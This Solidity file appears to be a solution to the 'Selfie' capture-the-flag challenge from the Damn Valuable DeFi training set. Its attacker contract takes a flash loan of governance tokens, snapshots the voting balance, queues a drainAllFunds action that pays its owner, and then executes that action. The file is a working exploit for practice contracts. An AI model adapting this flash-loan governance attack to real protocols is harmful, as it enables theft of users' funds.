// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "hardhat/console.sol";

contract SelfieAttacker {
    DamnValuableTokenSnapshot public token;
    SimpleGovernance public governance;
    SelfiePool public pool;
    address public owner;
    uint256 id;

    constructor(address _token, address _governance, address _pool) {
        token = DamnValuableTokenSnapshot(_token);
        governance = SimpleGovernance(_governance);
        pool = SelfiePool(_pool);
        owner = msg.sender;
    }

    function attack() external {
        pool.flashLoan(1500000 ether);
    }

    function receiveTokens(address _token, uint256 amount) external {
        token.snapshot();
        id = governance.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );
        token.transfer(address(pool), amount);
    }

    function execute() external {
        governance.executeAction(id);
    }
}
